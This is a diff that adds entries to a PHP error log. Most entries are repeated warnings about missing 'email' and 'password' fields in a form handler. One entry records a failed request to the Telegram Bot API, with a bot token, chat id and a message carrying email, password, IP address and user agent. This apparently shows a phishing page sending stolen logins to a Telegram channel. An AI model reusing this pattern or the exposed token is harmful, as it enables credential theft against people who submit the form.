@@ -50,3 +50,26 @@
 [16-Jan-2025 05:07:42 UTC] PHP Warning:  Undefined array key "password" in /home/rpj9adjia0pz/public_html/process_form.php on line 8
 [17-Jan-2025 09:58:22 UTC] PHP Warning:  Undefined array key "email" in /home/rpj9adjia0pz/public_html/process_form.php on line 7
 [17-Jan-2025 09:58:22 UTC] PHP Warning:  Undefined array key "password" in /home/rpj9adjia0pz/public_html/process_form.php on line 8
+[18-Jan-2025 13:09:14 UTC] PHP Warning:  Undefined array key "email" in /home/rpj9adjia0pz/public_html/process_form.php on line 7
+[18-Jan-2025 13:09:14 UTC] PHP Warning:  Undefined array key "password" in /home/rpj9adjia0pz/public_html/process_form.php on line 8
+[19-Jan-2025 10:30:35 UTC] PHP Warning:  Undefined array key "email" in /home/rpj9adjia0pz/public_html/process_form.php on line 7
+[19-Jan-2025 10:30:35 UTC] PHP Warning:  Undefined array key "password" in /home/rpj9adjia0pz/public_html/process_form.php on line 8
+[19-Jan-2025 10:32:07 UTC] PHP Warning:  file_get_contents(): SSL: Handshake timed out in /home/rpj9adjia0pz/public_html/process_form.php on line 49
+[19-Jan-2025 10:32:07 UTC] PHP Warning:  file_get_contents(): Failed to enable crypto in /home/rpj9adjia0pz/public_html/process_form.php on line 49
+[19-Jan-2025 10:32:07 UTC] PHP Warning:  file_get_contents(https://api.telegram.org/bot7996606148:AAGCkZCmT3y1en-3-zWmyk4almnDqZmbR8A/sendMessage?chat_id=-1002180753425&amp;text=%E2%95%AD%E2%94%81%E2%94%80%E2%94%81%E2%89%AA+Info+%E2%9D%84%EF%B8%8F+%E2%89%AB%E2%94%80%E2%94%81%E2%94%81%E2%95%AE%0A%0AI%D8%AA%D8%B3%D8%AC%D9%8A%D9%84+%D8%AF%D8%AE%D9%88%D9%84+%D8%B3%D9%84%D8%A9I%0A%0Aemail+%3A+%0Apass+%3A+%0A%0A------------------------%0A%0AIP+Address%3A+102.67.169.24++%28Nigeria%29%0A%0AUser+Agent%3A+Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F120.0.0.0+Safari%2F537.36%0A%E2%95%B0%E2%94%81%E2%94%80%E2%94%81%E2%89%AA+Info+%E2%9D%84%EF%B8%8F+%E2%89%AB%E2%94%80%E2%94%81%E2%94%81%E2%95%AF): Failed to open stream: operation failed in /home/rpj9adjia0pz/public_html/process_form.php on line 49
+[20-Jan-2025 06:59:12 UTC] PHP Warning:  Undefined array key "email" in /home/rpj9adjia0pz/public_html/process_form.php on line 7
+[20-Jan-2025 06:59:12 UTC] PHP Warning:  Undefined array key "password" in /home/rpj9adjia0pz/public_html/process_form.php on line 8
+[21-Jan-2025 10:57:03 UTC] PHP Warning:  Undefined array key "email" in /home/rpj9adjia0pz/public_html/process_form.php on line 7
+[21-Jan-2025 10:57:03 UTC] PHP Warning:  Undefined array key "password" in /home/rpj9adjia0pz/public_html/process_form.php on line 8
+[23-Jan-2025 06:00:24 UTC] PHP Warning:  Undefined array key "email" in /home/rpj9adjia0pz/public_html/process_form.php on line 7
+[23-Jan-2025 06:00:24 UTC] PHP Warning:  Undefined array key "password" in /home/rpj9adjia0pz/public_html/process_form.php on line 8
+[24-Jan-2025 16:22:13 UTC] PHP Warning:  Undefined array key "email" in /home/rpj9adjia0pz/public_html/process_form.php on line 7
+[24-Jan-2025 16:22:13 UTC] PHP Warning:  Undefined array key "password" in /home/rpj9adjia0pz/public_html/process_form.php on line 8
+[25-Jan-2025 16:52:34 UTC] PHP Warning:  Undefined array key "email" in /home/rpj9adjia0pz/public_html/process_form.php on line 7
+[25-Jan-2025 16:52:34 UTC] PHP Warning:  Undefined array key "password" in /home/rpj9adjia0pz/public_html/process_form.php on line 8
+[26-Jan-2025 07:36:48 UTC] PHP Warning:  Undefined array key "email" in /home/rpj9adjia0pz/public_html/process_form.php on line 7
+[26-Jan-2025 07:36:48 UTC] PHP Warning:  Undefined array key "password" in /home/rpj9adjia0pz/public_html/process_form.php on line 8
+[28-Jan-2025 05:03:19 UTC] PHP Warning:  Undefined array key "email" in /home/rpj9adjia0pz/public_html/process_form.php on line 7
+[28-Jan-2025 05:03:19 UTC] PHP Warning:  Undefined array key "password" in /home/rpj9adjia0pz/public_html/process_form.php on line 8
+[29-Jan-2025 09:36:37 UTC] PHP Warning:  Undefined array key "email" in /home/rpj9adjia0pz/public_html/process_form.php on line 7
+[29-Jan-2025 09:36:37 UTC] PHP Warning:  Undefined array key "password" in /home/rpj9adjia0pz/public_html/process_form.php on line 8
